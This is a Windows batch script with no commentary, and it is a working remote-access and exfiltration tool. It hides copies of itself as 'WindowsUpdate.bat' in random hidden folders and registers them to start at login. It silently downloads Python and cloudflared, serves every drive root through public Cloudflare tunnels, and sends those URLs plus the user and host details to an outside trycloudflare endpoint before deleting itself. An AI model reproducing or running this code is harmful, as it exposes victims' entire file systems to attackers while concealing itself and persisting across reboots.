

@echo off
setlocal enabledelayedexpansion

REM ============================
REM Step 0: Add to Autostart (No Admin)
REM ============================
@echo off
setlocal

REM ================================
REM Generate random folder names
REM ================================
set "F1=%RANDOM%"
set "F2=%RANDOM%"
set "F3=%RANDOM%"

REM Base folder in AppData
set "BASE_DIR=%APPDATA%\%F1%\%F2%\%F3%"

REM Create the folder
if not exist "%BASE_DIR%" mkdir "%BASE_DIR%"

REM Copy the exe itself into the random folder with the name intel.exe
set "GENUINE_NAME=WindowsUpdate.bat"
copy "%~f0" "%BASE_DIR%\%GENUINE_NAME%" /Y >nul

REM Hide the folder (optional)
attrib +h +s "%BASE_DIR%"

REM Set registry to auto-start the copied exe
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "\"%BASE_DIR%\%GENUINE_NAME%\"" /f >nul

echo Exe copied to: %BASE_DIR%\%GENUINE_NAME%
echo Auto-start enabled.

REM ============================
REM Config
REM ============================
set PYTHON_VERSION=3.12.5
set SERVER_PORT=8087

REM ============================
REM Step 1: Create a deep hidden folder
REM ============================
set "F1=%RANDOM%"
set "F2=%RANDOM%"
set "F3=%RANDOM%"
set "BASE_DIR=C:\Windows\Temp\!F1!\!F2!\!F3!"
mkdir "!BASE_DIR!" >nul 2>&1
attrib +h +s "!BASE_DIR!"

REM Paths
set PYTHON_DIR=!BASE_DIR!\python
set PYTHON_ZIP=!BASE_DIR!\python.zip
set CLOUD_FLARE_EXE=!BASE_DIR!\cloudflared.exe

REM ============================
REM Step 2: Download Portable Python
REM ============================
if not exist "!PYTHON_DIR!" (
    powershell -WindowStyle Hidden -Command "Invoke-WebRequest 'https://www.python.org/ftp/python/%PYTHON_VERSION%/python-%PYTHON_VERSION%-embed-amd64.zip' -OutFile '!PYTHON_ZIP!'"
    powershell -WindowStyle Hidden -Command "Expand-Archive -Path '!PYTHON_ZIP!' -DestinationPath '!PYTHON_DIR!'"
    del "!PYTHON_ZIP!"
)

REM Add Python to PATH
set PATH=!PYTHON_DIR!;%PATH%

REM ============================
REM Step 3: Download Cloudflared if missing
REM ============================
if not exist "!CLOUD_FLARE_EXE!" (
    powershell -WindowStyle Hidden -Command "Invoke-WebRequest https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe -OutFile '!CLOUD_FLARE_EXE!'"
)

REM ============================
REM Step 4: Create master Python script to handle all drives at ROOT
REM ============================
set "TEMP_PY=%TEMP%\_multi_drive_tunnel.py"
> "%TEMP_PY%" echo import subprocess,re,json,urllib.request,platform,os,socket,getpass,string,time,threading

>> "%TEMP_PY%" echo exe = r"!CLOUD_FLARE_EXE!"
>> "%TEMP_PY%" echo start_port = %SERVER_PORT%
>> "%TEMP_PY%" echo drives = [f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:/")]
>> "%TEMP_PY%" echo results = {}
>> "%TEMP_PY%" echo threads = []

>> "%TEMP_PY%" echo def run_tunnel(drive, port):
>> "%TEMP_PY%" echo     subprocess.Popen(["python","-m","http.server",str(port),"--bind","127.0.0.1"],cwd=drive,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
>> "%TEMP_PY%" echo     p = subprocess.Popen([exe,"tunnel","--url",f"http://localhost:{port}"],stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=True)
>> "%TEMP_PY%" echo     for line in p.stdout:
>> "%TEMP_PY%" echo         m = re.search(r"(https://[a-zA-Z0-9\-]+\.trycloudflare\.com)", line)
>> "%TEMP_PY%" echo         if m:
>> "%TEMP_PY%" echo             results[drive[0]] = m.group(1)
>> "%TEMP_PY%" echo             break

>> "%TEMP_PY%" echo port = start_port
>> "%TEMP_PY%" echo for drive in drives:
>> "%TEMP_PY%" echo     t = threading.Thread(target=run_tunnel,args=(drive,port))
>> "%TEMP_PY%" echo     t.start()
>> "%TEMP_PY%" echo     threads.append(t)
>> "%TEMP_PY%" echo     port += 1

>> "%TEMP_PY%" echo for t in threads:
>> "%TEMP_PY%" echo     t.join()

>> "%TEMP_PY%" echo payload = {
>> "%TEMP_PY%" echo     "user": getpass.getuser(),
>> "%TEMP_PY%" echo     "hostname": socket.gethostname(),
>> "%TEMP_PY%" echo     "platform": platform.system(),
>> "%TEMP_PY%" echo     "platform_release": platform.release(),
>> "%TEMP_PY%" echo     "platform_version": platform.version(),
>> "%TEMP_PY%" echo     "architecture": platform.architecture(),
>> "%TEMP_PY%" echo     "processor": platform.processor(),
>> "%TEMP_PY%" echo     "drives": results
>> "%TEMP_PY%" echo }
>> "%TEMP_PY%" echo data = json.dumps(payload).encode()
>> "%TEMP_PY%" echo req = urllib.request.Request("https://bon-straight-iron-reuters.trycloudflare.com/receive", data=data, headers={"Content-Type":"application/json"}, method="POST")
>> "%TEMP_PY%" echo try:
>> "%TEMP_PY%" echo     urllib.request.urlopen(req)
>> "%TEMP_PY%" echo except: pass

REM Run master tunnel script silently
start /B "" python "%TEMP_PY%" > nul 2>&1

REM === Self-delete logic ===
(
    echo @echo off
    echo :loop
    echo del "%%~f0" ^>nul 2^>nul
    echo if exist "%%~f0" goto loop
) > "%TEMP%\_delself.bat"

start "" /min cmd /c "%TEMP%\_delself.bat"
